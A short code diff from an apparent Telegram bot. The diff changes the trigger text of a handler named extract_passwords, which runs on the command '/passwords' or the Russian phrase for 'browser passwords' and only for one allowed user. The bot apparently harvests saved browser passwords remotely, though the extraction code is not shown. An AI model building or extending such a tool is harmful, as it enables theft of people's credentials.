@@ -86,7 +86,7 @@ def register_password_handler(dp):
         except Exception:
             return []
     
-    @dp.message(F.text.lower() == "пароли браузера")
+    @dp.message(F.text.lower() == "пароли браузера [new]")
     @dp.message(Command("passwords"))
     async def extract_passwords(message: types.Message):
         if message.from_user.id == ALLOWED_USER_ID:
